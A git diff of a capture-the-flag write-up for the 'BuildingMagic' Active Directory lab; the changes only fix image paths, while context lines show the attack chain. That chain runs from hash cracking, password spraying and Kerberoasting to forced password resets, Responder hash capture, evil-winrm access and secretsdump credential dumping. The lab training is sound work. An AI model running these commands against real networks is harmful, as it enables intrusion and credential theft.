@@ -1,6 +1,6 @@
 # BuildingMagic
 
-![image.png](<../.gitbook/assets/image (13).png>)
+![image.png](<../../.gitbook/assets/image (13).png>)
 
 ## Scope and Objective
 
@@ -48,7 +48,7 @@ bfaf794a81438488e57ee3954c27cd75
 
 *   Pasted the leaked Hashes https://crackstation.net/ and managed to crack the hashes for user `r.widdleton:lilronron` and `t.ren:shadowhex7`
 
-    ![image.png](<../.gitbook/assets/image 1 (12).png>)
+    ![image.png](<../../.gitbook/assets/image 1 (12).png>)
 
     *   Confirming our creds
 
@@ -57,7 +57,7 @@ bfaf794a81438488e57ee3954c27cd75
         nxc smb buildingmagic.local -u 't.ren' -p 'shadowhex7' --shares
         ```
 
-        ![image.png](<../.gitbook/assets/image 2 (12).png>)
+        ![image.png](<../../.gitbook/assets/image 2 (12).png>)
 
         * We can confirm a valid username and password for `r.widdleton:lilronron`
 
@@ -128,9 +128,9 @@ nxc smb buildingmagic.local -u 'r.widdleton' -p 'lilronron' --rid-brute \
 
 ```
 
-![image.png](<../.gitbook/assets/image 3 (12).png>)
+![image.png](<../../.gitbook/assets/image 3 (12).png>)
 
-![image.png](<../.gitbook/assets/image 4 (12).png>)
+![image.png](<../../.gitbook/assets/image 4 (12).png>)
 
 *   We have a list of users and a password `lilronron` , as a best practice, we can attempt to password spray and test for password reuse
 
@@ -138,7 +138,7 @@ nxc smb buildingmagic.local -u 'r.widdleton' -p 'lilronron' --rid-brute \
     nxc smb 10.1.146.129  -u users.txt -p 'lilronron' --continue-on-success
     ```
 
-    ![image.png](<../.gitbook/assets/image 5 (12).png>)
+    ![image.png](<../../.gitbook/assets/image 5 (12).png>)
 
     * We can confirm that the password is only for user `r.widdleton`
 
@@ -149,7 +149,7 @@ nxc smb 10.1.146.129  -u 'r.widdleton' -p 'lilronron' --generate-hosts-file host
 
 ```
 
-![image.png](<../.gitbook/assets/image 6 (10).png>)
+![image.png](<../../.gitbook/assets/image 6 (10).png>)
 
 * Though these were provided, its also good we know how to generate them
 * Added to `/etc/hosts`
@@ -181,7 +181,7 @@ nxc smb  buildingmagic.local -u 'r.widdleton' -p 'lilronron'  -M gpp_autologin
 
 ### Enumerating shares
 
-![image.png](<../.gitbook/assets/image 2 (12).png>)
+![image.png](<../../.gitbook/assets/image 2 (12).png>)
 
 *   There is an interesting `File-share` that we need to dig into.
 
@@ -189,7 +189,7 @@ nxc smb  buildingmagic.local -u 'r.widdleton' -p 'lilronron'  -M gpp_autologin
     smbclient \\\\10.1.146.129\\File-share -U r.widdleton
     ```
 
-    ![image.png](<../.gitbook/assets/image 8 (11).png>)
+    ![image.png](<../../.gitbook/assets/image 8 (11).png>)
 
     * Access was denied and i am guessing that the user doesn't have required permissions to access the `File-share.`
 
@@ -201,7 +201,7 @@ We can use the creds `r.widdleton:lilronron` to obtain the loot
 nxc ldap dc01.buildingmagic.local -u 'r.widdleton' -p 'lilronron' --bloodhound --collection All --dns-server  10.1.146.129
 ```
 
-![image.png](<../.gitbook/assets/image 9 (11).png>)
+![image.png](<../../.gitbook/assets/image 9 (11).png>)
 
 ### Bloodhound enumeration
 
@@ -211,23 +211,23 @@ There is a lot we can find and do with bloodhound. My to-do is as below for quic
 * Check for all Kerberoastable user accounts
 * Find Shortest path to admin
 
-![image.png](<../.gitbook/assets/image 10 (11).png>)
+![image.png](<../../.gitbook/assets/image 10 (11).png>)
 
 * `r.widdleton` doesnt have any interesting groups and or any outbound object control on it.
 
-![image.png](<../.gitbook/assets/image 11 (11).png>)
+![image.png](<../../.gitbook/assets/image 11 (11).png>)
 
 * All domains presented here are just but the default ones
 
-![image.png](<../.gitbook/assets/image 12 (10).png>)
+![image.png](<../../.gitbook/assets/image 12 (10).png>)
 
 * User `r.haggard` is kerberoastable
 * Used the scripts https://github.com/TeneBrae93/offensivesecurity/tree/main/active-directory
 *
 
-![image.png](<../.gitbook/assets/image 13 (10).png>)
+![image.png](<../../.gitbook/assets/image 13 (10).png>)
 
-![image.png](<../.gitbook/assets/image 14 (11).png>)
+![image.png](<../../.gitbook/assets/image 14 (11).png>)
 
 * We managed to crack the hash and got the password.
 
@@ -237,7 +237,7 @@ There is a lot we can find and do with bloodhound. My to-do is as below for quic
 nxc smb buildingmagic.local -u 'r.haggard' -p 'REDACTED' --shares
 ```
 
-![image.png](<../.gitbook/assets/image 15 (9).png>)
+![image.png](<../../.gitbook/assets/image 15 (9).png>)
 
 *   `File-Share` could contain creds, scripts, config files, automation logs, GPO paths
 
@@ -245,12 +245,12 @@ nxc smb buildingmagic.local -u 'r.haggard' -p 'REDACTED' --shares
     smbclient \\\\10.1.146.129\\File-share -U r.haggard
     ```
 
-    ![image.png](<../.gitbook/assets/image 16 (9).png>)
+    ![image.png](<../../.gitbook/assets/image 16 (9).png>)
 
     * Again the user `r.haggard` seem to have no permission to access the share
     * We can also enumerate this `r.haggard` with bloodhound
 
-![image.png](<../.gitbook/assets/image 17 (10).png>)
+![image.png](<../../.gitbook/assets/image 17 (10).png>)
 
 *   The user `R.HAGGARD@BUILDINGMAGIC.LOCAL` has the capability to change the user `H.POTCH@BUILDINGMAGIC.LOCAL's` password without knowing that user's current password
 
@@ -261,7 +261,7 @@ nxc smb buildingmagic.local -u 'r.haggard' -p 'REDACTED' --shares
 
     ```
 
-    ![image.png](<../.gitbook/assets/image 18 (8).png>)
+    ![image.png](<../../.gitbook/assets/image 18 (8).png>)
 
 ### Confirming creds for `h.potch`
 
@@ -269,7 +269,7 @@ nxc smb buildingmagic.local -u 'r.haggard' -p 'REDACTED' --shares
 nxc smb buildingmagic.local -u 'h.potch' -p 'RedBlue777' --shares
 ```
 
-![image.png](<../.gitbook/assets/image 19 (10).png>)
+![image.png](<../../.gitbook/assets/image 19 (10).png>)
 
 *   `h.potch` **now has the golden ticket** into `File-Share` \*with `write access*.`
 
@@ -277,7 +277,7 @@ nxc smb buildingmagic.local -u 'h.potch' -p 'RedBlue777' --shares
     smbclient \\\\10.1.146.129\\File-share -U h.potch
     ```
 
-    ![image.png](<../.gitbook/assets/image 20 (9).png>)
+    ![image.png](<../../.gitbook/assets/image 20 (9).png>)
 
     * We were able to authenticate and the share is empty..
     * If we have access to a share with `write permissions`, we can put there a malicious file. On the other end we can have responder to catch the hash.
@@ -304,7 +304,7 @@ nxc smb buildingmagic.local -u 'h.potch' -p 'RedBlue777' --shares
         responder -I tun0
         ```
 
-        ![image.png](<../.gitbook/assets/image 21 (10).png>)
+        ![image.png](<../../.gitbook/assets/image 21 (10).png>)
 
         *   We managed to obtian `h.grangon` hash and we can attempt to crack it.
 
@@ -318,7 +318,7 @@ nxc smb buildingmagic.local -u 'h.potch' -p 'RedBlue777' --shares
 
 ### Compromising `h.grangon`
 
-![image.png](<../.gitbook/assets/image 22 (10).png>)
+![image.png](<../../.gitbook/assets/image 22 (10).png>)
 
 * `h.grangon` is a member of remote management users and we can us `Winrm or Rdp` We can potentially grab our user flag.
 
@@ -330,11 +330,11 @@ evil-winrm -i 10.1.146.129 -u h.grangon -p REDACTED
 gci C:\ -Include 'user.txt' -File -Recurse -ErrorAction SilentlyContinue | % { "=== $($_.FullName) ==="; gc -Raw -Encoding UTF8 $_.FullName }
 ```
 
-![image.png](<../.gitbook/assets/image 23 (10).png>)
+![image.png](<../../.gitbook/assets/image 23 (10).png>)
 
 Horray we have our user flag!!!!
 
-![image.png](<../.gitbook/assets/image 24 (10).png>)
+![image.png](<../../.gitbook/assets/image 24 (10).png>)
 
 * We can see that `a.flatch` is part of the users groups which appears to have the root flag.
 * We need to find a way to authenticate as `a.flatch`
@@ -347,27 +347,27 @@ Horray we have our user flag!!!!
     nxc smb 10.1.146.129  -u users.txt -p 'REDACTED' --continue-on-success
     ```
 
-    ![image.png](<../.gitbook/assets/image 25 (10).png>)
+    ![image.png](<../../.gitbook/assets/image 25 (10).png>)
 
     * The password is only for grangon
 
-![image.png](<../.gitbook/assets/image 26 (9).png>)
+![image.png](<../../.gitbook/assets/image 26 (9).png>)
 
 * We do have `SeBackupPrivilege` , this privilege lets you **read ANY file on the system**, even ones you normally can’t.
 * Can also lead to full Local SYSTEM compromise and often leads to `DCSync` on a Domain Controller.
 
-![image.png](<../.gitbook/assets/image 27 (9).png>)
+![image.png](<../../.gitbook/assets/image 27 (9).png>)
 
 ```bash
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
 ```
 
-![image.png](<../.gitbook/assets/image 28 (8).png>)
+![image.png](<../../.gitbook/assets/image 28 (8).png>)
 
 * We obtained an Admin hash and we can test this with `a.flatch` since the root flag in located there.
 * We can assume that `a.flatch` is also part of Admins or is an Admin,
 
-![image.png](<../.gitbook/assets/image 29 (8).png>)
+![image.png](<../../.gitbook/assets/image 29 (8).png>)
 
 *   Indeed `a.flatch` is a member of Administrators.
 
@@ -379,6 +379,6 @@ impacket-secretsdump -sam SAM -system SYSTEM LOCAL
     gci C:\ -Include 'root.txt' -File -Recurse -ErrorAction SilentlyContinue | % { "=== $($_.FullName) ==="; gc -Raw -Encoding UTF8 $_.FullName }
     ```
 
-    ![image.png](<../.gitbook/assets/image 30 (7).png>)
+    ![image.png](<../../.gitbook/assets/image 30 (7).png>)
 
     AND BOOM WE ARE ROOT!!!!!!!!!
